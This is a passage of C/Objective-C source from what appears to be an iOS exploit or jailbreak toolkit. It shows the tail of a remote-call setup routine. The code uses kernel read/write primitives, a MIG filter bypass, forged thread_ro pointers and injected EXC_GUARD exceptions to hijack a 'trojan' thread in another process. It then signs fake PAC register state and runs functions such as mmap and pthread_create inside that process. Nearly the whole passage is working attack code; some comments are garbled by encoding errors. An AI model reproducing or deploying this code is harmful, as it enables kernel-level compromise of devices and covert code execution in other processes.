                   (unsigned long long)test_thread,
                   (unsigned long long)test_tro,
                   _rc_is_kptr(test_tro) ? "VALID" : "INVALID");
        }
    }

    // Walk the task's thread list using XNU queue_iterate pattern:
    // task->threads is queue_head_t; next points to thread->task_threads (queue_chain_t)
    // thread_t = chain_ptr - rc_off_thread_task_threads_next
    uint64_t sentinel  = g_RC_taskAddr + rc_off_task_threads_next;
    uint64_t chain     = kread64(sentinel);                // first chain entry
    uint64_t firstThread = chain ? (chain - rc_off_thread_task_threads_next) : 0;

    while (chain && chain != sentinel && retryCount < 10 && --maxIter > 0) {
        uint64_t currThread = chain - rc_off_thread_task_threads_next;
        uint64_t nextChain  = kread64(currThread + rc_off_thread_task_threads_next);

        // Sanity: nextChain must be a kernel pointer or sentinel; if it's not,
        // the chain offset is wrong вЂ” abort before cycling forever.
        if (nextChain != sentinel && nextChain < 0xFFFFFF8000000000ULL) {
            printf("[%s:%d] chain=0x%llx nextChain=0x%llx is not a kptr вЂ” wrong chain offset? Stopping walk.\n",
                   __FUNCTION__, __LINE__,
                   (unsigned long long)chain, (unsigned long long)nextChain);
            break;
        }

        uint64_t tro = thread_get_t_tro(currThread);

        // Enhanced 8kSec-inspired TRO validation for A12X iOS 17.3.1
        // Use comprehensive PAC-aware validation
        bool is_valid_tro = _rc_is_kptr(tro);
        if (is_valid_tro) {
            // Additional validation using 8kSec techniques
            is_valid_tro = _rc_validate_thread_tro(tro, rc_off_task_threads_next);
        }

        // [Data-Only / PPL Fix] Verify that tro is an actual kernel pointer
        // before blindly writing it. Writing garbage (like 0x2f00) into t_tro
        // triggers `zone_require_ro failed` because 0x2f00 is not in the thread_ro zone.
        if (!is_valid_tro) {
            printf("[%s:%d] SKIP invalid tro: 0x%llx (not a valid kernel pointer, PAC validation failed)\n",
                   __FUNCTION__, __LINE__, (unsigned long long)tro);
            chain = nextChain;
            continue;
        }

        validThreadCount++;

        kwrite64(g_RC_dummyThreadAddr + rc_off_thread_t_tro, tro);

        if (useMigFilterBypass)
            mig_bypass_resume();

        if (!set_exception_port_on_thread(firstExceptionPort, currThread, useMigFilterBypass)) {
            printf("[%s:%d] set_exception_port on 0x%llx failed\n",
                   __FUNCTION__, __LINE__, (unsigned long long)currThread);
            if (validThreadCount == 1) {
                firstThread = retry_first_thread(useMigFilterBypass);
                chain = firstThread + rc_off_thread_task_threads_next;
                retryCount++;
                continue;
            }
        } else {
            if (!inject_guard_exception(currThread, guardCode)) {
                printf("[%s:%d] inject EXC_GUARD on 0x%llx failed\n",
                       __FUNCTION__, __LINE__, (unsigned long long)currThread);
                if (validThreadCount == 1) {
                    firstThread = retry_first_thread(useMigFilterBypass);
                    chain = firstThread + rc_off_thread_task_threads_next;
                    retryCount++;
                    continue;
                }
            } else {
                [g_RC_threadList addObject:@(currThread)];
                successThreadCount++;
            }
        }
        chain = nextChain;
    }

    // Р”Р»СЏ UI fallback: СЃРѕС…СЂР°РЅСЏРµРј С‡РёСЃР»Рѕ РІР°Р»РёРґРЅС‹С… РїРѕС‚РѕРєРѕРІ
    g_RC_validThreadCount = validThreadCount;

    if (useMigFilterBypass)
        mig_bypass_pause();

    printf("[%s:%d] Valid threads: %d, Injected: %d\n",
           __FUNCTION__, __LINE__, validThreadCount, successThreadCount);

    if (g_RC_threadList.count == 0) {
        printf("[%s:%d] No exceptions injected. Aborting.\n", __FUNCTION__, __LINE__);
        destroy_remote_call();
        return -1;
    }

    // Receive first exception from the trojan thread (LightSaber-inspired EXC_GUARD analysis)
    ExceptionMessage exc;
    if (!wait_exception(firstExceptionPort, &exc, 120000, false)) {
        printf("[%s:%d] Failed to receive first exception\n", __FUNCTION__, __LINE__);
        destroy_remote_call();
        return -1;
    }

    // Analyze EXC_GUARD code (LightSaber-inspired)
    if (exc.Head.msgh_id == EXC_GUARD) {
        printf("[EXC_GUARD] Received guard exception вЂ” analyzing code:\n");
        analyze_exc_guard_code(exc.codeFirst);
    }

    memcpy(&g_RC_originalState, &exc.threadState, sizeof(arm_thread_state64_internal));

    // Clear guard exception on remaining threads
    for (NSNumber *t in g_RC_threadList) {
        clear_guard_exception(t.unsignedLongLongValue);
    }

    // Drain any remaining exceptions
    ExceptionMessage exc2;
    int drainTimeout = 1500;
    while (wait_exception(firstExceptionPort, &exc2, drainTimeout, false)) {
        reply_with_state(&exc2, &exc2.threadState);
    }

    // The trojan thread is the one that delivered the exception.
    // exc.header.msgh_remote_port is a send right inserted into OUR IPC space вЂ”
    // look it up in our own task to get the kernel thread_t kobject address.
    mach_port_t trojanMachPort = exc.Head.msgh_remote_port;
    g_RC_trojanThreadAddr = task_get_ipc_port_kobject(task_self_kptr(), trojanMachPort);
    if (!g_RC_trojanThreadAddr)
        g_RC_trojanThreadAddr = firstThread;  // fallback

    // Send trojan to FAKE_PC_TROJAN_CREATOR so it now loops waiting for calls
    arm_thread_state64_internal newState = exc.threadState;
    sign_state(g_RC_trojanThreadAddr, &newState, FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR);
    reply_with_state(&exc, &newState);

    // trojanMem = SP of the trojan thread (user-space), used as shared scratch
    uint64_t trojanMemTemp = ((uint64_t)exc.threadState.__sp & 0x7fffffffffULL) - 0x100ULL;
    printf("[%s:%d] trojanMemTemp: 0x%llx\n", __FUNCTION__, __LINE__,
           (unsigned long long)trojanMemTemp);

    g_RC_vmMap = task_get_vm_map(g_RC_taskAddr);

    uint64_t remoteCrashSigned = remote_pac(g_RC_trojanThreadAddr, FAKE_PC_TROJAN, 0);
    do_remote_call_temp(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0); // sanity check
    do_remote_call_temp(100, "pthread_create_suspended_np",
                        trojanMemTemp, 0, remoteCrashSigned, 0, 0, 0, 0, 0);

    uint64_t pthreadAddr = remote_read64(trojanMemTemp);
    printf("[%s:%d] pthreadAddr: 0x%llx\n", __FUNCTION__, __LINE__,
           (unsigned long long)pthreadAddr);

    uint64_t callThreadPort = do_remote_call_temp(100, "pthread_mach_thread_np",
                                                   pthreadAddr, 0, 0, 0, 0, 0, 0, 0);
    printf("[%s:%d] callThreadPort: 0x%llx\n", __FUNCTION__, __LINE__,
           (unsigned long long)callThreadPort);
    g_RC_callThreadAddr = task_get_ipc_port_kobject(g_RC_taskAddr, (mach_port_t)callThreadPort);

    if (useMigFilterBypass)
        mig_bypass_resume();

    if (!set_exception_port_on_thread(secondExceptionPort, g_RC_callThreadAddr, useMigFilterBypass)) {
        printf("[%s:%d] Failed set exc port on call thread\n", __FUNCTION__, __LINE__);
        // fallback: re-create dummy
        pthread_create_suspended_np(&dummyThread, NULL, (void *(*)(void *))dummyFunc, NULL);
        g_RC_dummyThreadMach = pthread_mach_thread_np(dummyThread);
        g_RC_dummyThreadAddr = task_get_ipc_port_kobject(task_self_kptr(), g_RC_dummyThreadMach);
        g_RC_dummyThreadTro  = kread64(g_RC_dummyThreadAddr + rc_off_thread_t_tro);
        sleep(1);
        if (!set_exception_port_on_thread(secondExceptionPort, g_RC_callThreadAddr, useMigFilterBypass)) {
            if (useMigFilterBypass)
                mig_bypass_pause();
            destroy_remote_call();
            return -1;
        }
    }

    if (useMigFilterBypass)
        mig_bypass_pause();

    printf("[%s:%d] Resuming call thread\n", __FUNCTION__, __LINE__);

    uint64_t ret = do_remote_call_temp(100, "thread_resume", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
    if (ret != 0) {
        printf("[%s:%d] thread_resume returned 0x%llx\n",
               __FUNCTION__, __LINE__, (unsigned long long)ret);
    }

    g_RC_trojanMem = do_remote_call_stable(1000, "mmap",
                                           0, PAGE_SIZE, VM_PROT_READ | VM_PROT_WRITE,
                                           MAP_PRIVATE | MAP_ANON, (uint64_t)-1, 0, 0, 0);

    do_remote_call_stable(100, "memset", g_RC_trojanMem, 0, PAGE_SIZE, 0, 0, 0, 0, 0);

    g_RC_success = true;
    printf("[%s:%d] init_remote_call('%s') done. trojanMem=0x%llx\n",
           __FUNCTION__, __LINE__, process, (unsigned long long)g_RC_trojanMem);
    return 0;
}

